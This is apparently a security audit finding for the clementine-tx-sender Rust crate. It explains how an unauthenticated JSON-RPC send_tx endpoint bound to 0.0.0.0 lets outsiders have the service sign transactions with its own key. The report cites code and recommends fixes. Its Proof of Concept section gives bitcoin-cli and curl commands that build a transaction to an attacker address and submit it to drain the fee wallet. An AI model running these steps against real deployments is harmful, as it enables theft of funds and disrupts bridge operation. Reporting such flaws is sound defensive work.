### Title
Unauthenticated tx-sender JSON-RPC Server Allows Arbitrary Transaction Signing and Fee-Wallet Drain When Bound to `0.0.0.0` - (`crates/clementine-tx-sender/src/jsonrpc/server.rs`)

---

### Summary

The standalone `clementine-tx-sender` JSON-RPC server exposes a `send_tx` endpoint with **no authentication, no mTLS, and no caller verification**. When the server is configured to bind to `0.0.0.0` (an explicitly supported and validated configuration), any network-reachable party can submit arbitrary transactions — including transactions carrying `rbf_signing_info` — causing the tx-sender to sign with its own Taproot key and broadcast the result. This drains the tx-sender-managed fee-paying UTXOs and disrupts bridge liveness, potentially exposing operator collateral to slashing.

---

### Finding Description

The gRPC servers for the Operator, Verifier, and Aggregator are protected by mutual TLS (mTLS) with certificate-based role enforcement. [1](#0-0)  The JSON-RPC server for the standalone tx-sender has no equivalent protection. `start_jsonrpc_server` builds a plain HTTP `jsonrpsee` server with no middleware, no token check, and no TLS: [2](#0-1) 

The configuration layer explicitly permits `0.0.0.0` as a bind address:

```rust
if bind != "127.0.0.1" && bind != "0.0.0.0" {
    return Err(BridgeError::EnvVarMalformed(...));
}
``` [3](#0-2) 

When bound to `0.0.0.0`, the `send_tx` method accepts a fully attacker-controlled `InsertTryToSendParams`, including:
- `signed_tx_hex` — the raw transaction to queue
- `fee_paying_type` — whether to use CPFP or RBF
- `rbf_signing_info` — instructs the tx-sender to re-sign a specific input with its own Taproot key during fee bumping [4](#0-3) 

When `fee_paying_type = RBF` and `rbf_signing_info` is present, the tx-sender's processing loop calls `attempt_sign_psbt`, which computes the Taproot sighash for the attacker-specified input index and signs it with the tx-sender's `secret_key`:

```rust
let signature = self.signer.sign_with_tweak_data(sighash, tweak_data)?;
``` [5](#0-4) 

The tx-sender's `secret_key` is derived directly from `BridgeConfig.secret_key` in core usage: [6](#0-5) 

The `TxSenderSigningKey` derives a Taproot address from this key, and the tx-sender's fee-paying UTXOs reside at that address: [7](#0-6) 

---

### Impact Explanation

An attacker who can reach the JSON-RPC port (reachable when `TX_SENDER_JSONRPC_BIND=0.0.0.0`) can:

1. **Drain tx-sender-managed fee-paying UTXOs**: Craft a transaction spending a UTXO at the tx-sender's Taproot address (derivable from the public key), set `rbf_signing_info.vout` to that input index, and submit it. The tx-sender signs and broadcasts the transaction, transferring the UTXO to the attacker.

2. **Disrupt bridge liveness**: With the fee-paying wallet drained, the operator can no longer fund CPFP/RBF fee bumps for kickoff, challenge-timeout, reimburse, and disprove transactions. These transactions stall unconfirmed.

3. **Slashable exposure of operator collateral**: If the operator cannot broadcast a `ChallengeTimeout` or `DisproveTimeout` transaction in time because fee bumping is broken, the challenge window expires and the operator's collateral UTXO becomes spendable by the challenger — a direct slashable loss of operator collateral.

---

### Likelihood Explanation

- The `0.0.0.0` bind is an explicitly supported, documented configuration value (not a misconfiguration that bypasses a guard).
- The standalone tx-sender is designed for containerized/microservice deployments where `0.0.0.0` is the standard bind address for inter-service communication.
- No credentials, tokens, or certificates are required to call `send_tx`.
- The tx-sender's Taproot address is deterministically derivable from its public key, which is observable on-chain.

---

### Recommendation

Add authentication to the JSON-RPC server before it can be used in production. Options in increasing strength:

1. **Shared-secret bearer token**: Require a configurable `Authorization: Bearer <token>` header on every request; reject without it.
2. **mTLS**: Mirror the gRPC layer — require a client certificate signed by the same CA used for gRPC actors.
3. **Restrict to loopback only**: Remove `0.0.0.0` as a valid bind address; force `127.0.0.1` so only co-located processes can reach the server.

Additionally, the `rbf_signing_info` path should validate that the input being signed belongs to a transaction type and UTXO that the tx-sender is legitimately responsible for, rather than signing any caller-supplied sighash.

---

### Proof of Concept

```
# 1. Discover the tx-sender's Taproot address from its public key (observable on-chain or from config).
# 2. Find a UTXO at that address (e.g., via bitcoin-cli scantxoutset).
UTXO_TXID=<txid>
UTXO_VOUT=<vout>
UTXO_VALUE=<satoshis>

# 3. Craft a raw transaction spending that UTXO, sending to attacker address.
RAW_TX=$(bitcoin-cli createrawtransaction \
  '[{"txid":"'$UTXO_TXID'","vout":'$UTXO_VOUT'}]' \
  '[{"<attacker_address>": <amount_btc>}]')

# 4. Submit to the unauthenticated JSON-RPC server (bound to 0.0.0.0:3030).
curl -s -X POST http://<tx-sender-host>:3030 \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0","id":1,"method":"send_tx",
    "params":[{
      "signed_tx_hex": "'$RAW_TX'",
      "fee_paying_type": "RBF",
      "rbf_signing_info": {
        "vout": 0,
        "spend_path": {"KeyPath": {"merkle_root": []}},
        "tap_sighash_type": 0
      },
      "cancel_outpoints": [],
      "cancel_txids": [],
      "activate_txids": [],
      "activate_outpoints": []
    }]
  }'

# 5. The tx-sender signs input 0 with its secret_key and broadcasts the transaction.
#    The UTXO at the tx-sender's address is transferred to the attacker.
#    Subsequent bridge transactions (kickoff, reimburse, disprove) cannot be fee-bumped.
```

### Citations

**File:** core/src/servers.rs (L79-139)
```rust
        ServerAddr::Tcp(socket_addr) => {
            let cert = tokio::fs::read(&config.server_cert_path)
                .await
                .wrap_err(format!(
                    "Failed to read server certificate from {}",
                    config.server_cert_path.display()
                ))?;
            let key = tokio::fs::read(&config.server_key_path)
                .await
                .wrap_err(format!(
                    "Failed to read server key from {}",
                    config.server_key_path.display()
                ))?;

            let server_identity = Identity::from_pem(cert, key);

            // Load CA certificate for client verification
            let client_ca_cert = tokio::fs::read(&config.ca_cert_path)
                .await
                .wrap_err(format!(
                    "Failed to read CA certificate from {}",
                    config.ca_cert_path.display()
                ))?;

            let client_ca = Certificate::from_pem(client_ca_cert);

            // Build TLS configuration
            let tls_config = if config.client_verification {
                ServerTlsConfig::new()
                    .identity(server_identity)
                    .client_ca_root(client_ca)
            } else {
                ServerTlsConfig::new().identity(server_identity)
            };

            let service = InterceptedService::new(
                service,
                if config.client_verification {
                    let client_cert = CertificateDer::from_pem_file(&config.client_cert_path)
                        .wrap_err(format!(
                            "Failed to read client certificate from {}",
                            config.client_cert_path.display()
                        ))?
                        .to_owned();

                    let aggregator_cert =
                        CertificateDer::from_pem_file(&config.aggregator_cert_path)
                            .wrap_err(format!(
                                "Failed to read aggregator certificate from {}",
                                config.aggregator_cert_path.display()
                            ))?
                            .to_owned();

                    OnlyAggregatorAndSelf {
                        aggregator_cert,
                        our_cert: client_cert,
                    }
                } else {
                    Noop
                },
            );
```

**File:** crates/clementine-tx-sender/src/jsonrpc/server.rs (L42-111)
```rust
pub async fn start_jsonrpc_server(
    tx_sender_client: TxSenderClient,
    bind_addr: SocketAddr,
) -> Result<TxSenderJsonRpcServer, BridgeError> {
    let server: Server = ServerBuilder::default()
        .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
        .build(bind_addr)
        .await
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let local_addr = server
        .local_addr()
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let mut module = RpcModule::new(tx_sender_client.clone());
    module
        .register_async_method("send_tx", |params, client, _| async move {
            let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;

            let raw_tx = hex::decode(&req.signed_tx_hex).map_err(jsonrpc_err)?;
            let signed_tx: Transaction = consensus::deserialize(&raw_tx).map_err(jsonrpc_err)?;

            let mut dbtx = client.db.begin_transaction().await.map_err(jsonrpc_err)?;

            let try_to_send_id = client
                .insert_try_to_send(
                    &mut dbtx,
                    req.tx_metadata,
                    &signed_tx,
                    req.fee_paying_type,
                    req.rbf_signing_info,
                    &req.cancel_outpoints,
                    &req.cancel_txids,
                    &req.activate_txids,
                    &req.activate_outpoints,
                )
                .await
                .map_err(jsonrpc_err)?;

            client
                .db
                .commit_transaction(dbtx)
                .await
                .map_err(jsonrpc_err)?;

            Ok::<u32, ErrorObjectOwned>(try_to_send_id)
        })
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    // Citrea-specific RPCs.
    #[cfg(feature = "citrea")]
    {
        module
            .register_async_method("send_citrea_tx", |params, client, _| async move {
                let req: InsertCitreaRawTxParams = params.one().map_err(jsonrpc_err)?;

                let insertion_id = client
                    .send_citrea_tx(req.citrea_tx_request)
                    .await
                    .map_err(jsonrpc_err)?;

                Ok::<i64, ErrorObjectOwned>(insertion_id)
            })
            .map_err(|e| BridgeError::Eyre(e.into()))?;
    }

    let handle = server.start(module);

    Ok(TxSenderJsonRpcServer { handle, local_addr })
}
```

**File:** crates/clementine-tx-sender/src/config.rs (L197-212)
```rust
        #[cfg(feature = "json-rpc")]
        let jsonrpc = {
            let port = env_parse_optional::<u16>("TX_SENDER_JSONRPC_PORT")?;
            port.map(|port| {
                let bind = env_optional("TX_SENDER_JSONRPC_BIND")
                    .unwrap_or_else(|| "127.0.0.1".to_string());
                if bind != "127.0.0.1" && bind != "0.0.0.0" {
                    return Err(BridgeError::EnvVarMalformed(
                        "TX_SENDER_JSONRPC_BIND",
                        "bind must be either 127.0.0.1 or 0.0.0.0".to_string(),
                    ));
                }
                Ok(TxSenderJsonRpcConfig { bind, port })
            })
            .transpose()?
        };
```

**File:** crates/clementine-tx-sender/src/rbf.rs (L365-368)
```rust
        let signature = self
            .signer
            .sign_with_tweak_data(sighash, tweak_data)
            .map_err(|e| eyre!("Failed to sign input: {}", e))?;
```

**File:** core/src/config/mod.rs (L353-376)
```rust
        TxSenderConfig {
            network: self.protocol_paramset.network,
            secret_key: self.secret_key,
            private_da_key: None,
            postgres: TxSenderPostgresConfig {
                host: self.db_host.clone(),
                port: self.db_port,
                user: self.db_user.clone(),
                password: self.db_password.clone(),
                dbname: self.db_name.clone(),
            },
            bitcoin_rpc: TxSenderBitcoinRpcConfig {
                url: self.bitcoin_rpc_url.clone(),
                user: self.bitcoin_rpc_user.clone(),
                password: self.bitcoin_rpc_password.clone(),
            },
            mempool: self.mempool_config(),
            limits: self.tx_sender_limits.clone(),
            finality_depth: self.protocol_paramset.finality_depth,
            // poll_delay_ms not used in clementine, poll delay for txsender is defined in core/src/task/tx_sender.rs
            poll_delay_ms: 60_000,
            include_unsafe: false,
            jsonrpc: None,
        }
```

**File:** crates/clementine-tx-sender/src/signer.rs (L36-47)
```rust
impl TxSenderSigningKey {
    pub(crate) fn new(secret_key: SecretKey, network: Network) -> Self {
        let keypair = Keypair::from_secret_key(&SECP, &secret_key);
        let (xonly, _parity) = XOnlyPublicKey::from_keypair(&keypair);
        let address = Address::p2tr(&SECP, xonly, None, network);

        Self {
            keypair,
            xonly_public_key: xonly,
            address,
        }
    }
```
